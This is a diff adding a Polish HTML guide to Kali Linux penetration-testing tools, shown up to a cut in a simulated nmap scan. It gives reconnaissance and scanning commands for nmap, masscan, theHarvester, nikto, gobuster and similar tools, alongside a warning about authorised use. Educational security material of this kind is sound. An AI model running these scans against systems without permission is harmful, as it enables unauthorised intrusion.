@@ -1,0 +1,2021 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kali Linux - Zaawansowany przewodnik po narzędziach penetracyjnych</title>
+    <style>
+        /* ===== RESET & ZMIENNE ===== */
+        :root {
+            --primary: #1a1a2e;
+            --secondary: #0f3460;
+            --accent: #e94560;
+            --accent2: #00b894;
+            --accent3: #fdcb6e;
+            --bg: #0f0f1a;
+            --card-bg: #1a1a2e;
+            --text: #e6e6e6;
+            --text-light: #a0a0a0;
+            --shadow: 0 10px 30px rgba(0,0,0,0.3);
+            --radius: 12px;
+            --terminal-green: #00ff88;
+            --terminal-red: #ff5555;
+            --terminal-yellow: #ffaa00;
+            --terminal-blue: #66aaff;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Cascadia Code', 'Consolas', monospace;
+            background: var(--bg);
+            color: var(--text);
+            line-height: 1.7;
+            scroll-behavior: smooth;
+        }
+
+        /* ===== NAWIGACJA ===== */
+        nav {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background: rgba(26, 26, 46, 0.95);
+            backdrop-filter: blur(10px);
+            z-index: 1000;
+            padding: 0;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.5);
+            border-bottom: 1px solid rgba(233, 69, 96, 0.3);
+        }
+
+        nav ul {
+            display: flex;
+            justify-content: center;
+            list-style: none;
+            flex-wrap: wrap;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        nav ul li a {
+            display: block;
+            color: #e6e6e6;
+            text-decoration: none;
+            padding: 18px 16px;
+            font-size: 0.85rem;
+            font-weight: 500;
+            transition: all 0.3s;
+            border-bottom: 3px solid transparent;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        nav ul li a:hover {
+            background: rgba(233, 69, 96, 0.2);
+            border-bottom: 3px solid var(--accent);
+            color: var(--accent);
+        }
+
+        /* ===== HERO ===== */
+        .hero {
+            background: linear-gradient(135deg, #0c0c1a, #1a1a2e, #16213e);
+            color: white;
+            text-align: center;
+            padding: 160px 20px 100px;
+            position: relative;
+            overflow: hidden;
+            border-bottom: 1px solid rgba(233, 69, 96, 0.2);
+        }
+
+        .hero::before {
+            content: "nmap hydra metasploit burpsuite wireshark aircrack-ng sqlmap john hashcat nikto dirbuster gobuster setoolkit beef-xss";
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            font-size: 1.2rem;
+            color: rgba(0, 255, 136, 0.05);
+            word-wrap: break-word;
+            line-height: 2;
+            pointer-events: none;
+            padding: 20px;
+            letter-spacing: 8px;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .hero h1 {
+            font-size: 3.5rem;
+            margin-bottom: 20px;
+            position: relative;
+            text-shadow: 0 0 30px rgba(233, 69, 96, 0.5);
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .hero h1 span {
+            color: var(--accent);
+        }
+
+        .hero p {
+            font-size: 1.3rem;
+            color: #a0a0c0;
+            max-width: 800px;
+            margin: 0 auto 30px;
+            position: relative;
+        }
+
+        .hero .badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            flex-wrap: wrap;
+            position: relative;
+        }
+
+        .badge {
+            background: rgba(233, 69, 96, 0.15);
+            border: 1px solid rgba(233, 69, 96, 0.3);
+            padding: 10px 20px;
+            border-radius: 50px;
+            font-size: 0.9rem;
+            backdrop-filter: blur(5px);
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        /* ===== KONTENERY ===== */
+        .container {
+            max-width: 1300px;
+            margin: 0 auto;
+            padding: 0 25px;
+        }
+
+        section {
+            padding: 80px 0;
+        }
+
+        .section-title {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .section-title h2 {
+            font-size: 2.5rem;
+            color: var(--accent);
+            margin-bottom: 10px;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .section-title .underline {
+            width: 80px;
+            height: 4px;
+            background: linear-gradient(90deg, var(--accent), var(--terminal-green));
+            margin: 15px auto;
+            border-radius: 2px;
+        }
+
+        .section-title p {
+            color: var(--text-light);
+            font-size: 1.1rem;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        /* ===== KARTY ===== */
+        .card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            padding: 35px;
+            margin-bottom: 30px;
+            border: 1px solid rgba(233, 69, 96, 0.1);
+            transition: transform 0.3s, box-shadow 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
+        }
+
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 4px;
+            height: 100%;
+            background: linear-gradient(to bottom, var(--accent), var(--terminal-green));
+        }
+
+        .card h3 {
+            font-size: 1.6rem;
+            margin-bottom: 20px;
+            color: var(--terminal-green);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .card h3 .icon {
+            font-size: 2rem;
+        }
+
+        .card p, .card li {
+            color: var(--text-light);
+            font-size: 1.05rem;
+        }
+
+        /* ===== KATEGORIE NARZĘDZI ===== */
+        .tools-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 30px;
+            margin: 40px 0;
+        }
+
+        .tool-card {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 30px;
+            box-shadow: var(--shadow);
+            border-top: 4px solid var(--terminal-green);
+            transition: all 0.3s;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            border-left: 1px solid rgba(0, 255, 136, 0.1);
+            border-right: 1px solid rgba(0, 255, 136, 0.1);
+        }
+
+        .tool-card:hover {
+            transform: translateY(-8px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
+            border-top-color: var(--accent);
+        }
+
+        .tool-card:nth-child(2) { border-top-color: var(--terminal-blue); }
+        .tool-card:nth-child(3) { border-top-color: var(--accent); }
+        .tool-card:nth-child(4) { border-top-color: var(--terminal-yellow); }
+        .tool-card:nth-child(5) { border-top-color: var(--accent2); }
+        .tool-card:nth-child(6) { border-top-color: var(--terminal-red); }
+
+        .tool-card .tool-category {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+            padding: 6px 12px;
+            border-radius: 20px;
+            font-weight: 600;
+            font-size: 0.8rem;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .tool-card h4 {
+            font-size: 1.4rem;
+            margin-bottom: 15px;
+            color: var(--text);
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .tool-card h4 .tool-icon {
+            color: var(--terminal-green);
+            margin-right: 10px;
+        }
+
+        .tool-card .tool-description {
+            flex-grow: 1;
+            margin-bottom: 20px;
+            color: var(--text-light);
+        }
+
+        .tool-card .command-example {
+            background: #0c0c18;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 15px 0;
+            border-left: 3px solid var(--terminal-green);
+            overflow-x: auto;
+            font-family: 'Cascadia Code', monospace;
+            font-size: 0.95rem;
+        }
+
+        .command-example .prompt {
+            color: var(--terminal-green);
+            font-weight: bold;
+        }
+
+        .command-example .command {
+            color: white;
+        }
+
+        .command-example .comment {
+            color: #666;
+            font-style: italic;
+        }
+
+        .tool-card .tool-options {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin-top: 15px;
+        }
+
+        .option-tag {
+            background: rgba(0, 255, 136, 0.1);
+            color: var(--terminal-green);
+            padding: 4px 10px;
+            border-radius: 15px;
+            font-size: 0.85rem;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        /* ===== SYMULATOR TERMINALA ===== */
+        .terminal-container {
+            background: #0c0c18;
+            border-radius: var(--radius);
+            padding: 30px;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            margin: 30px 0;
+        }
+
+        .terminal-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .terminal-dots {
+            display: flex;
+            gap: 8px;
+            margin-right: 15px;
+        }
+
+        .dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+
+        .dot.red { background: var(--terminal-red); }
+        .dot.yellow { background: var(--terminal-yellow); }
+        .dot.green { background: var(--terminal-green); }
+
+        .terminal-title {
+            color: var(--text-light);
+            font-family: 'Cascadia Code', monospace;
+            font-size: 0.9rem;
+        }
+
+        .terminal-content {
+            background: #000;
+            border-radius: 8px;
+            padding: 20px;
+            min-height: 300px;
+            overflow-y: auto;
+            font-family: 'Cascadia Code', monospace;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+
+        .terminal-line {
+            margin-bottom: 8px;
+        }
+
+        .terminal-prompt {
+            color: var(--terminal-green);
+            font-weight: bold;
+        }
+
+        .terminal-command {
+            color: white;
+        }
+
+        .terminal-output {
+            color: var(--text-light);
+        }
+
+        .terminal-output.success {
+            color: var(--terminal-green);
+        }
+
+        .terminal-output.error {
+            color: var(--terminal-red);
+        }
+
+        .terminal-output.warning {
+            color: var(--terminal-yellow);
+        }
+
+        .terminal-output.info {
+            color: var(--terminal-blue);
+        }
+
+        /* ===== TABELE ===== */
+        .table-wrapper {
+            overflow-x: auto;
+            border-radius: var(--radius);
+            box-shadow: var(--shadow);
+            margin: 30px 0;
+            border: 1px solid rgba(233, 69, 96, 0.1);
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            background: var(--card-bg);
+        }
+
+        th {
+            background: linear-gradient(135deg, var(--primary), #16213e);
+            color: white;
+            padding: 16px 20px;
+            text-align: left;
+            font-size: 0.95rem;
+            font-family: 'Cascadia Code', monospace;
+            border-bottom: 2px solid var(--accent);
+        }
+
+        td {
+            padding: 14px 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            color: var(--text-light);
+            font-size: 0.95rem;
+        }
+
+        tr:nth-child(even) {
+            background: rgba(26, 26, 46, 0.5);
+        }
+
+        tr:hover {
+            background: rgba(233, 69, 96, 0.1);
+        }
+
+        .command-cell {
+            font-family: 'Cascadia Code', monospace;
+            color: var(--terminal-green);
+        }
+
+        /* ===== WORKFLOW PENETRACYJNY ===== */
+        .workflow-steps {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 20px;
+            margin: 40px 0;
+        }
+
+        .workflow-step {
+            background: var(--card-bg);
+            border-radius: var(--radius);
+            padding: 25px;
+            flex: 1;
+            min-width: 250px;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+            position: relative;
+        }
+
+        .workflow-step::before {
+            content: attr(data-step);
+            position: absolute;
+            top: -15px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 30px;
+            height: 30px;
+            background: var(--accent);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .workflow-step h4 {
+            color: var(--terminal-green);
+            margin-bottom: 10px;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        /* ===== LABORATORIUM ===== */
+        .lab-container {
+            background: linear-gradient(135deg, #0c0c18, #1a1a2e);
+            border-radius: var(--radius);
+            padding: 40px;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(233, 69, 96, 0.2);
+            margin: 40px 0;
+        }
+
+        .lab-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 30px;
+        }
+
+        .lab-controls {
+            display: flex;
+            gap: 10px;
+        }
+
+        .lab-btn {
+            padding: 10px 20px;
+            background: rgba(233, 69, 96, 0.2);
+            color: var(--accent);
+            border: 1px solid rgba(233, 69, 96, 0.3);
+            border-radius: 6px;
+            cursor: pointer;
+            font-family: 'Cascadia Code', monospace;
+            transition: all 0.3s;
+        }
+
+        .lab-btn:hover {
+            background: rgba(233, 69, 96, 0.3);
+        }
+
+        .lab-btn.primary {
+            background: var(--accent);
+            color: white;
+        }
+
+        .lab-btn.primary:hover {
+            background: #ff2e4f;
+        }
+
+        /* ===== FOOTER ===== */
+        footer {
+            background: linear-gradient(135deg, #0c0c18, #1a1a2e);
+            color: #a0a0c0;
+            text-align: center;
+            padding: 50px 20px;
+            border-top: 1px solid rgba(233, 69, 96, 0.2);
+        }
+
+        footer h3 {
+            color: var(--accent);
+            margin-bottom: 10px;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        footer p {
+            max-width: 500px;
+            margin: 0 auto 20px;
+            font-size: 0.95rem;
+        }
+
+        footer .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin-bottom: 20px;
+        }
+
+        footer .footer-links a {
+            color: var(--terminal-green);
+            text-decoration: none;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        footer .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* ===== ANIMACJE ===== */
+        .fade-in {
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.6s ease;
+        }
+
+        .fade-in.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* ===== RESPONSYWNOŚĆ ===== */
+        @media (max-width: 768px) {
+            .hero h1 { font-size: 2.2rem; }
+            .hero p { font-size: 1rem; }
+            .section-title h2 { font-size: 1.8rem; }
+            .card { padding: 25px; }
+            nav ul li a { padding: 12px 10px; font-size: 0.75rem; }
+            .tools-grid { grid-template-columns: 1fr; }
+            .terminal-container { padding: 20px; }
+        }
+
+        /* Smooth scroll */
+        html {
+            scroll-behavior: smooth;
+            scroll-padding-top: 80px;
+        }
+
+        /* Listy */
+        .card ul, .card ol {
+            padding-left: 20px;
+            margin: 15px 0;
+        }
+
+        .card ul li, .card ol li {
+            margin-bottom: 8px;
+            position: relative;
+        }
+
+        .card ul li::before {
+            content: "▶";
+            color: var(--terminal-green);
+            position: absolute;
+            left: -20px;
+            font-size: 0.8rem;
+        }
+
+        /* Sekcje specjalne */
+        .warning-box {
+            background: rgba(255, 85, 85, 0.1);
+            border-left: 4px solid var(--terminal-red);
+            border-radius: 0 8px 8px 0;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .warning-box h4 {
+            color: var(--terminal-red);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .info-box {
+            background: rgba(102, 170, 255, 0.1);
+            border-left: 4px solid var(--terminal-blue);
+            border-radius: 0 8px 8px 0;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .info-box h4 {
+            color: var(--terminal-blue);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .success-box {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid var(--terminal-green);
+            border-radius: 0 8px 8px 0;
+            padding: 20px;
+            margin: 20px 0;
+        }
+
+        .success-box h4 {
+            color: var(--terminal-green);
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        /* Tooltip */
+        .tooltip {
+            position: relative;
+            display: inline-block;
+            border-bottom: 1px dashed var(--terminal-green);
+            cursor: help;
+        }
+
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 300px;
+            background-color: #0c0c18;
+            color: var(--text);
+            text-align: center;
+            border-radius: 6px;
+            padding: 10px;
+            position: absolute;
+            z-index: 1;
+            bottom: 125%;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+            transition: opacity 0.3s;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            font-size: 0.9rem;
+            font-family: 'Cascadia Code', monospace;
+        }
+
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- NAWIGACJA -->
+    <nav>
+        <ul>
+            <li><a href="#intro">Wprowadzenie</a></li>
+            <li><a href="#recon">Reconnaissance</a></li>
+            <li><a href="#scanning">Scanning</a></li>
+            <li><a href="#exploitation">Exploitation</a></li>
+            <li><a href="#post">Post-Exploitation</a></li>
+            <li><a href="#web">Web Hacking</a></li>
+            <li><a href="#wireless">Wireless</a></li>
+            <li><a href="#forensics">Forensics</a></li>
+            <li><a href="#terminal">Terminal</a></li>
+            <li><a href="#workflow">Workflow</a></li>
+        </ul>
+    </nav>
+
+    <!-- HERO -->
+    <header class="hero">
+        <h1>🐉 Kali Linux <span>// Advanced Tool Guide</span></h1>
+        <p>Zaawansowany przewodnik po 200+ narzędziach penetracyjnych. Kompletne komendy, przykłady użycia i zaawansowane techniki.</p>
+        <div class="badges">
+            <span class="badge"># Penetration Testing</span>
+            <span class="badge"># Digital Forensics</span>
+            <span class="badge"># Reverse Engineering</span>
+            <span class="badge"># Security Research</span>
+        </div>
+    </header>
+
+    <!-- WPROWADZENIE -->
+    <section id="intro">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>🛡️ Kali Linux - Podstawy</h2>
+                <div class="underline"></div>
+                <p>Profesjonalna dystrybucja do testów penetracyjnych i bezpieczeństwa</p>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">⚙️</span> Czym jest Kali Linux?</h3>
+                <p><strong>Kali Linux</strong> to zaawansowana dystrybucja Linuksa stworzona przez Offensive Security, przeznaczona do testów penetracyjnych, audytów bezpieczeństwa i badań w zakresie cyberbezpieczeństwa.</p>
+                
+                <div class="info-box">
+                    <h4>📦 Key Features:</h4>
+                    <ul>
+                        <li><strong>600+ specjalistycznych narzędzi</strong> - preinstalowane i skonfigurowane</li>
+                        <li><strong>Wielojęzyczne wsparcie</strong> - pełne tłumaczenia</li>
+                        <li><strong>Custom kernel</strong> - z patchemi dla iniekcji pakietów</li>
+                        <li><strong>Developerskie środowisko</strong> - VSCode, compilery, debuggers</li>
+                        <li><strong>ARM support</strong> - dla Raspberry Pi, IoT devices</li>
+                    </ul>
+                </div>
+
+                <div class="warning-box">
+                    <h4>⚠️ Legalne Użycie</h4>
+                    <p>Kali Linux powinien być używany <strong>TYLKO</strong> na systemach, na które masz pisemne pozwolenie do testów. Nieautoryzowane testy penetracyjne są nielegalne w większości krajów.</p>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">📚</span> Struktura Katalogów Kali</h3>
+                <p>Kali organizuje narzędzia w logiczne kategorie w menu Applications:</p>
+
+                <div class="table-wrapper">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Kategoria</th>
+                                <th>Przykładowe narzędzia</th>
+                                <th>Ścieżka w terminalu</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>Information Gathering</td>
+                                <td>nmap, recon-ng, maltego</td>
+                                <td class="command-cell">/usr/bin/nmap</td>
+                            </tr>
+                            <tr>
+                                <td>Vulnerability Analysis</td>
+                                <td>openvas, nikto, lynis</td>
+                                <td class="command-cell">/usr/bin/nikto</td>
+                            </tr>
+                            <tr>
+                                <td>Web Application Analysis</td>
+                                <td>burpsuite, sqlmap, dirb</td>
+                                <td class="command-cell">/usr/bin/sqlmap</td>
+                            </tr>
+                            <tr>
+                                <td>Database Assessment</td>
+                                <td>sqlmap, sqlninja, oscanner</td>
+                                <td class="command-cell">/usr/bin/sqlninja</td>
+                            </tr>
+                            <tr>
+                                <td>Password Attacks</td>
+                                <td>john, hashcat, hydra</td>
+                                <td class="command-cell">/usr/bin/hashcat</td>
+                            </tr>
+                            <tr>
+                                <td>Wireless Attacks</td>
+                                <td>aircrack-ng, reaver, kismet</td>
+                                <td class="command-cell">/usr/bin/aircrack-ng</td>
+                            </tr>
+                            <tr>
+                                <td>Reverse Engineering</td>
+                                <td>ghidra, radare2, edb-debugger</td>
+                                <td class="command-cell">/usr/bin/ghidra</td>
+                            </tr>
+                            <tr>
+                                <td>Exploitation Tools</td>
+                                <td>metasploit, searchsploit</td>
+                                <td class="command-cell">/usr/bin/msfconsole</td>
+                            </tr>
+                            <tr>
+                                <td>Sniffing & Spoofing</td>
+                                <td>wireshark, ettercap, bettercap</td>
+                                <td class="command-cell">/usr/bin/bettercap</td>
+                            </tr>
+                            <tr>
+                                <td>Post Exploitation</td>
+                                <td>mimikatz, powersploit</td>
+                                <td class="command-cell">/usr/share/powersploit</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- RECONNAISSANCE -->
+    <section id="recon" style="background: rgba(15, 52, 96, 0.1);">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>🔍 Faza 1: Reconnaissance</h2>
+                <div class="underline"></div>
+                <p>Zbieranie informacji i rozpoznanie celu</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Nmap -->
+                <div class="tool-card">
+                    <div class="tool-category">Network Scanner</div>
+                    <h4><span class="tool-icon">🗺️</span> Nmap</h4>
+                    <p class="tool-description">Zaawansowany skaner sieciowy do discovery i audytu bezpieczeństwa.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">nmap -sS -sV -O -p- 192.168.1.1</span><br>
+                        <span class="comment"># Stealth SYN scan + version detection + OS fingerprinting</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-sS</span>
+                        <span class="option-tag">-sV</span>
+                        <span class="option-tag">-O</span>
+                        <span class="option-tag">-p-</span>
+                        <span class="option-tag">-A</span>
+                        <span class="option-tag">-T4</span>
+                    </div>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">nmap --script vuln 192.168.1.0/24</span><br>
+                        <span class="comment"># Automatyczne skanowanie podatności w całej sieci</span>
+                    </div>
+                </div>
+
+                <!-- Recon-ng -->
+                <div class="tool-card">
+                    <div class="tool-category">OSINT Framework</div>
+                    <h4><span class="tool-icon">🕵️</span> Recon-ng</h4>
+                    <p class="tool-description">Kompletne środowisko OSINT (Open Source Intelligence) z modułami.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">recon-ng</span><br>
+                        <span class="comment">[recon-ng][default] > modules load recon/domains-hosts/brute_hosts</span><br>
+                        <span class="comment">[recon-ng][default][brute_hosts] > set SOURCE example.com</span><br>
+                        <span class="comment">[recon-ng][default][brute_hosts] > run</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">workspaces</span>
+                        <span class="option-tag">modules</span>
+                        <span class="option-tag">database</span>
+                        <span class="option-tag">reporting</span>
+                    </div>
+                </div>
+
+                <!-- theHarvester -->
+                <div class="tool-card">
+                    <div class="tool-category">Email/Subdomain</div>
+                    <h4><span class="tool-icon">📧</span> theHarvester</h4>
+                    <p class="tool-description">Zbieranie emaili, subdomen, hostów z publicznych źródeł.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">theHarvester -d example.com -b all -l 500</span><br>
+                        <span class="comment"># Zbieranie z wszystkich źródeł, limit 500 wyników</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-d</span>
+                        <span class="option-tag">-b</span>
+                        <span class="option-tag">-l</span>
+                        <span class="option-tag">-f</span>
+                        <span class="option-tag">-g</span>
+                    </div>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">theHarvester -d example.com -b google,bing,linkedin -n -c</span><br>
+                        <span class="comment"># Zbieranie z Google, Bing, LinkedIn z weryfikacją DNS</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card fade-in">
+                <h3><span class="icon">🎯</span> Zaawansowane Techniki Recon</h3>
+                
+                <div class="info-box">
+                    <h4>🌐 Passive Reconnaissance (Pasywne rozpoznanie)</h4>
+                    <p>Zbieranie informacji bez bezpośredniej interakcji z celem:</p>
+                    <ul>
+                        <li><strong>WHOIS lookup:</strong> <span class="command-cell">whois example.com</span></li>
+                        <li><strong>DNS enumeration:</strong> <span class="command-cell">dnsrecon -d example.com</span></li>
+                        <li><strong>Google Dorks:</strong> <span class="command-cell">site:example.com filetype:pdf</span></li>
+                        <li><strong>Shodan:</strong> <span class="command-cell">shodan search apache country:PL</span></li>
+                        <li><strong>Wayback Machine:</strong> <span class="command-cell">waybackurls example.com</span></li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <h4>🎪 Active Reconnaissance (Aktywne rozpoznanie)</h4>
+                    <p>Bezpośrednia interakcja z systemami celu:</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">nmap -sn 192.168.1.0/24</span><br>
+                        <span class="comment"># Ping sweep całej sieci (host discovery)</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">masscan -p1-65535 10.0.0.0/8 --rate=1000</span><br>
+                        <span class="comment"># Szybkie skanowanie portów dużej sieci</span><br><br>
+                        
+                        <span class="prompt">root@kali:~#</span> <span class="command">sublist3r -d example.com -o subdomains.txt</span><br>
+                        <span class="comment"># Enumeracja subdomen</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- SCANNING -->
+    <section id="scanning">
+        <div class="container">
+            <div class="section-title fade-in">
+                <h2>📡 Faza 2: Scanning & Enumeration</h2>
+                <div class="underline"></div>
+                <p>Identyfikacja otwartych portów, usług i podatności</p>
+            </div>
+
+            <div class="tools-grid fade-in">
+                <!-- Nikto -->
+                <div class="tool-card">
+                    <div class="tool-category">Web Scanner</div>
+                    <h4><span class="tool-icon">🌐</span> Nikto</h4>
+                    <p class="tool-description">Zaawansowany skaner serwerów WWW do wykrywania niebezpiecznych plików i konfiguracji.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">nikto -h http://example.com -o report.html -Format htm</span><br>
+                        <span class="comment"># Skanowanie z zapisem raportu HTML</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-h</span>
+                        <span class="option-tag">-p</span>
+                        <span class="option-tag">-ssl</span>
+                        <span class="option-tag">-Tuning</span>
+                        <span class="option-tag">-evasion</span>
+                    </div>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">nikto -h 192.168.1.100 -C all -Display V</span><br>
+                        <span class="comment"># Sprawdź wszystkie testy z verbose output</span>
+                    </div>
+                </div>
+
+                <!-- OpenVAS -->
+                <div class="tool-card">
+                    <div class="tool-category">Vulnerability Scanner</div>
+                    <h4><span class="tool-icon">🔓</span> OpenVAS</h4>
+                    <p class="tool-description">Kompleksowy system skanowania podatności z bazą 50,000+ testów.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">gvm-cli socket --socketpath /run/gvmd/gvmd.sock --gmp-username admin --gmp-password 'password' get_scanners</span><br>
+                        <span class="comment"># Lista dostępnych skanerów OpenVAS</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">gvm-setup</span>
+                        <span class="option-tag">gvm-start</span>
+                        <span class="option-tag">gvm-cli</span>
+                        <span class="option-tag">Greenbone</span>
+                    </div>
+                </div>
+
+                <!-- Dirb/Dirbuster -->
+                <div class="tool-card">
+                    <div class="tool-category">Directory Bruteforce</div>
+                    <h4><span class="tool-icon">📁</span> Dirb & Gobuster</h4>
+                    <p class="tool-description">Enumeracja katalogów i plików poprzez brute-force.</p>
+                    <div class="command-example">
+                        <span class="prompt">root@kali:~#</span> <span class="command">dirb http://example.com /usr/share/wordlists/dirb/common.txt -X .php,.txt</span><br>
+                        <span class="comment"># Dirb z rozszerzeniami PHP i TXT</span><br><br>
+                        <span class="prompt">root@kali:~#</span> <span class="command">gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50</span><br>
+                        <span class="comment"># Gobuster z 50 wątkami (szybszy)</span>
+                    </div>
+                    <div class="tool-options">
+                        <span class="option-tag">-u</span>
+                        <span class="option-tag">-w</span>
+                        <span class="option-tag">-t</span>
+                        <span class="option-tag">-x</span>
+                        <span class="option-tag">-o</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SYMULATOR TERMINALA -->
+            <div class="terminal-container fade-in">
+                <div class="terminal-header">
+                    <div class="terminal-dots">
+                        <div class="dot red"></div>
+                        <div class="dot yellow"></div>
+                        <div class="dot green"></div>
+                    </div>
+                    <div class="terminal-title">kali@terminal:~ (Scanning Session)</div>
+                </div>
+                <div class="terminal-content" id="terminalOutput">
+                    <div class="terminal-line">
+                        <span class="terminal-prompt">kali@scan:~#</span>
+                        <span class="terminal-command">nmap -sV -sC -p 21,22,80,443,3306 10.0.2.15</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">Starting Nmap 7.92 ( https://nmap.org )</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">Nmap scan report for 10.0.2.15</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">PORT     STATE SERVICE     VERSION</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">21/tcp   open  ftp         vsftpd 3.0.3</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">22/tcp   open  ssh         OpenSSH 8.4p1 Ubuntu</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">80/tcp   open  http        Apache httpd 2.4.46</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">443/tcp  open  ssl/http    Apache httpd 2.4.46</span>
+                    </div>
+                    <div class="terminal-line">
+                        <span class="terminal-output">3306/tcp open  mysql       MySQL 8.0.27</span>
+                    </div>
+                    <div class="terminal-line">
